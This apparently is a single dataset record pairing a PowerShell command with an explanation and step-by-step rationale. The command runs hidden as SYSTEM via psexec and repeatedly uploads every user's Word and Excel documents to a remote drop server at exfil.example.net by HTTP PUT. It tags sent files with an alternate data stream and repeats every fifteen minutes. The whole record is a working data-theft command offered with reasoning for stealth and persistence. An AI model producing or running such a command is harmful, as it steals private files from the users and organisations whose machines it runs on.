command: psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; while ($true){ Get-ChildItem 'C:\Users\*\Documents' -Include *.docx,*.xlsx -Recurse -File | Where-Object { -not (Get-Item -Path $_.FullName -Stream 'exfil' -ErrorAction SilentlyContinue) } | ForEach-Object { try { Invoke-WebRequest -Uri ('https://exfil.example.net/drop/' + $_.Name) -Method Put -InFile $_.FullName -UseBasicParsing | Out-Null; Set-Content -Path $_.FullName -Stream 'exfil' -Value 'sent' -ErrorAction SilentlyContinue } catch {} }; Start-Sleep 900 }"
explanation: Automates exfiltration of office documents via HTTP PUT and tags files with an alternate data stream to prevent re-sending.
rationale_steps: Launch as SYSTEM with PSExec to avoid user prompts and run hidden.
Recursively enumerate target document types across user folders.
Upload files using Invoke-WebRequest PUT to a remote drop endpoint.
Write an 'exfil' ADS marker to each successfully uploaded file.
Sleep and repeat to maintain ongoing automated exfiltration.
